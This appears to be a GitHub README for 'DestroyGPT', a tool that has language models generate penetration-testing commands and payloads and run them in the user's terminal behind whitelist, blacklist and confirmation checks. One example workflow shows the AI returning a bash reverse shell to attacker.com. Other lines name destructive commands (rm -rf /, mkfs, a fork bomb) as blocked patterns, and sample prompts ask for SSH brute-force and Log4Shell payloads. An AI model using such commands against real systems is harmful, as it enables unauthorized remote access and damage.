# 🛡️ DestroyGPT

```
 ██████╗ ███████╗███████╗████████╗██████╗  ██████╗ ██╗   ██╗ ██████╗ ██████╗ ████████╗
 ██╔══██╗██╔════╝██╔════╝╚══██╔══╝██╔══██╗██╔═══██╗╚██╗ ██╔╝██╔════╝██╔════╝ ╚══██╔══╝
 ██║  ██║█████╗  ███████╗   ██║   ██████╔╝██║   ██║ ╚████╔╝ ██║     ██║        ██║
 ██║  ██║██╔══╝  ╚════██║   ██║   ██╔══██╗██║   ██║  ╚██╔╝  ██║     ██║        ██║
 ██████╔╝███████╗███████║   ██║   ██║  ██║╚██████╔╝   ██║   ╚██████╗╚██████╗   ██║
 ╚═════╝ ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝ ╚═════╝   ╚═╝

   AI-Powered CLI for Ethical Hacking with Safe Command Execution
```

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![OpenRouter API](https://img.shields.io/badge/OpenRouter-Integrated-green.svg)](https://openrouter.ai)
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](https://github.com/sujallamichhane18/DestroyGPT/pulls)

---

## 📺 Demo

```
╔════════════════════════════════════════════════════════════════════════════╗
║                         DestroyGPT Live Session                            ║
╠════════════════════════════════════════════════════════════════════════════╣
║                                                                            ║
║  DestroyGPT >>> Generate a command to scan open ports on example.com     ║
║  ┌─ AI Processing... ──────────────────────────────────────────────────┐ ║
║  │ nmap -sV example.com                                                 │ ║
║  └──────────────────────────────────────────────────────────────────────┘ ║
║                                                                            ║
║  ✓ Command 1: nmap -sV example.com                                        ║
║  ⚙️  Safety Check: PASSED (Whitelist: ✓ | Blacklist: ✓ | Keywords: ✓)    ║
║                                                                            ║
║  Proceed? (y/N) y                                                         ║
║                                                                            ║
║  [•••] Executing command...                                               ║
║                                                                            ║
║  Starting Nmap 7.92 ( https://nmap.org )                                  ║
║  Nmap scan report for example.com                                         ║
║  Host is up (0.042s latency).                                             ║
║                                                                            ║
║  PORT      STATE    SERVICE VERSION                                       ║
║  22/tcp    open     ssh     OpenSSH 7.4                                   ║
║  80/tcp    open     http    Apache httpd 2.4.6                            ║
║  443/tcp   open     https   Apache httpd 2.4.6                            ║
║                                                                            ║
║  ✓ Command executed successfully. (Saved to history)                     ║
║  DestroyGPT >>>                                                           ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
```

> **Add a GIF demo here:** Upload a screen recording to your repo assets folder and reference it:  
> `![DestroyGPT Demo](assets/demo.gif)`

---

## 🎯 Overview

DestroyGPT is a secure, AI-assisted terminal tool designed for **penetration testers** and **ethical hackers**. It integrates with **OpenRouter.ai** to leverage advanced language models—DeepSeek-R1, GPT-4o, Grok—for generating security commands, payloads, and exploit strategies.

Unlike traditional CLI tools, DestroyGPT enables **direct command execution** in your terminal while enforcing **multi-layered security mechanisms** to prevent accidental or malicious damage.

---

## ✨ Features

```
┌─────────────────────────────────────────────────────────────────┐
│                    🔐 SECURITY FIRST                             │
├─────────────────────────────────────────────────────────────────┤
│  ✓ Whitelist Enforcement                                         │
│  ✓ Blacklist Pattern Detection                                   │
│  ✓ Danger Keyword Alerts                                         │
│  ✓ Docker Sandbox Isolation                                      │
│  ✓ Interactive Confirmation                                      │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│                   🚀 POWERFUL CAPABILITIES                        │
├─────────────────────────────────────────────────────────────────┤
│  ⚡ Multi-Model LLM Support (GPT-4o, DeepSeek-R1, Grok)         │
│  ⚡ Streaming AI Responses                                        │
│  ⚡ Command History (Up to 5,000 commands)                        │
│  ⚡ Rotating Audit Logs                                           │
│  ⚡ Dry-Run Mode for Validation                                   │
│  ⚡ Timeout & Interrupt Protection                                │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🚀 Quick Start

### 📋 Prerequisites

- Python 3.8+
- pip package manager
- Git
- (Optional) Docker for sandbox mode

### 💾 Installation

```bash
# Clone repository
git clone https://github.com/sujallamichhane18/DestroyGPT.git
cd DestroyGPT

# Install dependencies
pip install -r requirements.txt
```

### 🔑 API Configuration

Get your API key from [OpenRouter.ai](https://openrouter.ai)

**Option 1: Secure File Storage** (Recommended)
```bash
echo "sk_openrouter_your_api_key_here" > ~/.destroygpt_api_key
chmod 600 ~/.destroygpt_api_key
```

**Option 2: Environment Variable**
```bash
export OPENROUTER_API_KEY="sk_openrouter_your_api_key_here"
```

### ▶️ Launch

```bash
python destroygpt_advanced.py
```

---

## 📖 Usage Guide

### 🎮 Interactive Mode

```bash
DestroyGPT >>> help
DestroyGPT >>> Generate a payload for SQL injection testing
DestroyGPT >>> List all open ports on my network
DestroyGPT >>> Create a brute-force script for SSH
```

### 🛠️ Special Commands

```
╔════════════════════════════════════════════════════════════════╗
║  COMMAND                  │  DESCRIPTION                        ║
╠════════════════════════════════════════════════════════════════╣
║  cmd: <command>           │  Execute system command directly    ║
║  help                     │  Show available commands            ║
║  history                  │  View command history              ║
║  clear                    │  Clear screen                       ║
║  exit / quit              │  Terminate session                  ║
║  dry-run <command>        │  Preview without executing          ║
╚════════════════════════════════════════════════════════════════╝
```

### 💡 Example Workflows

**Port Scanning:**
```
DestroyGPT >>> Generate an aggressive nmap scan on 192.168.1.0/24
AI Response: nmap -sS -sV -O -p- 192.168.1.0/24
✓ Command approved and executed
```

**Payload Generation:**
```
DestroyGPT >>> Create a reverse shell payload for Linux
AI Response: bash -i >& /dev/tcp/attacker.com/4444 0>&1
⚠️ Danger Keywords Detected - Manual Confirmation Required
Proceed? (y/N) y
```

---

## 🛡️ Security Architecture

```
                    ┌─────────────────────┐
                    │   User Input        │
                    └──────────┬──────────┘
                               │
                    ┌──────────▼──────────┐
                    │  Layer 1: Whitelist │◄────✓ nmap, curl, ssh
                    └──────────┬──────────┘     ✗ Unknown tools
                               │
                    ┌──────────▼──────────┐
                    │ Layer 2: Blacklist  │◄────✗ rm -rf /, mkfs
                    └──────────┬──────────┘     ✗ Fork bombs
                               │
                    ┌──────────▼──────────┐
                    │ Layer 3: Keywords   │◄────⚠️  Dangerous patterns
                    └──────────┬──────────┘     ➜ Manual confirm
                               │
                    ┌──────────▼──────────┐
                    │  Layer 4: Sandbox   │◄────🐳 Optional Docker
                    └──────────┬──────────┘     🐳 Ubuntu 22.04
                               │
                    ┌──────────▼──────────┐
                    │ Layer 5: Execution  │◄────⏱️  Timeout: 300s
                    └──────────┬──────────┘     📝 Logging
                               │
                    ┌──────────▼──────────┐
                    │   Command Output    │
                    └─────────────────────┘
```

---

## 📊 Safety Matrix

| Component | Protection | Status |
|-----------|-----------|--------|
| **Whitelist** | Only approved tools | ✅ Enabled |
| **Blacklist** | Dangerous patterns blocked | ✅ Enabled |
| **Keywords** | Manual confirmation | ✅ Interactive |
| **Sandbox** | Docker isolation | ⚙️ Optional |
| **Timeouts** | Process limits (300s) | ✅ Enabled |
| **Logging** | Audit trail | ✅ Rotating logs |
| **History** | Command storage | ✅ 5,000 max |

---

## ⚙️ Configuration

Create a `config.json` for advanced settings:

```json
{
  "model": "gpt-4o",
  "api_timeout": 30,
  "execution_timeout": 300,
  "max_history": 5000,
  "docker_enabled": false,
  "log_retention_days": 30,
  "whitelist": ["nmap", "curl", "ssh", "dig"],
  "danger_keywords": ["rm -rf", "mkfs", ":(){ :|:& };:"]
}
```

---

## 📚 Examples

### Penetration Testing
```bash
DestroyGPT >>> Scan for vulnerabilities on example.com
DestroyGPT >>> Generate exploit payload for CVE-2021-44228
DestroyGPT >>> Create network reconnaissance script
```

### Security Research
```bash
DestroyGPT >>> Analyze malware sandbox output
DestroyGPT >>> Generate payload for privilege escalation testing
DestroyGPT >>> Create fuzzing scripts
```

---

## 🐛 Troubleshooting

**Issue: API Key Not Found**
```bash
✗ Error: OPENROUTER_API_KEY not configured
✓ Solution: Set ~/.destroygpt_api_key or export OPENROUTER_API_KEY
```

**Issue: Docker Sandbox Unavailable**
```bash
⚠️  Warning: Docker not detected. Sandbox mode disabled.
✓ Solution: Install Docker or disable sandbox requirement
```

**Issue: Command Timeout**
```bash
⏱️  Timeout: Command exceeded 300 seconds
✓ Solution: Increase execution_timeout in config.json
```

---

## ⚠️ Legal & Ethical Notice

```
╔═══════════════════════════════════════════════════════════════════╗
║                      ⚠️  IMPORTANT DISCLAIMER                     ║
╠═══════════════════════════════════════════════════════════════════╣
║                                                                   ║
║  This tool is EXCLUSIVELY for:                                    ║
║  ✓ Authorized penetration testing                                 ║
║  ✓ Legitimate security research                                   ║
║  ✓ Educational purposes                                           ║
║                                                                   ║
║  UNAUTHORIZED ACCESS IS ILLEGAL                                   ║
║  • Violates Computer Fraud & Abuse Act (CFAA)                    ║
║  • Subject to criminal penalties                                  ║
║  • User assumes ALL liability                                     ║
║                                                                   ║
║  By using DestroyGPT, you agree to use it ONLY for authorized    ║
║  activities and comply with all applicable laws and regulations.  ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝
```

---

## 📜 License

Licensed under the **MIT License** – see [LICENSE](LICENSE) for full details.

```
MIT License

Copyright (c) 2024 Sujal Lamichhane

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
```

---

## 🔗 Resources & Links

- 🌐 [OpenRouter.ai](https://openrouter.ai) – LLM API
- 📖 [Documentation](https://github.com/sujallamichhane18/DestroyGPT/wiki)
- 🐛 [Report Issues](https://github.com/sujallamichhane18/DestroyGPT/issues)
- 💬 [Discussions](https://github.com/sujallamichhane18/DestroyGPT/discussions)
- ⭐ [Support this Project](https://github.com/sujallamichhane18/DestroyGPT/stargazers)

---

## 🤝 Contributing

We welcome contributions! Please:

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/amazing-feature`)
3. Commit changes (`git commit -m 'Add amazing feature'`)
4. Push to branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

---

```
╔════════════════════════════════════════════════════════════════════╗
║                    Built by Sujal Lamichhane                       ║
║               For ethical hackers and security pros                 ║
║                     Use responsibly. Stay safe.                     ║
╚════════════════════════════════════════════════════════════════════╝
```
